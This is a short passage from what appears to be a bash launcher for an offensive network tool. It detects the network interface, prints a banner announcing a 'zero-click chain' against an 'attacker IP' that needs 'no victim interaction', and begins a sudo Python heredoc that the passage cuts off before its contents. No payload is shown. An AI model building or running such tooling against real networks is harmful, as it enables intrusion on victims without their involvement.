        IFACE=$(ip route get 8.8.8.8 2>/dev/null | awk '/dev/{for(i=1;i<=NF;i++) if($i=="dev"){print $(i+1);exit}}')
        [ -z "$IFACE" ] && IFACE="eth0"
    fi

    banner
    step 1 "ZERO-CLICK CHAIN"
    echo ""
    info "Attacker IP : $IP"
    info "Interface   : $IFACE"
    info "All layers launch simultaneously — no victim interaction needed"
    echo ""

    sudo python3 - "$IP" "$IFACE" "$ACTION" "$DIR" << 'PYEOF'
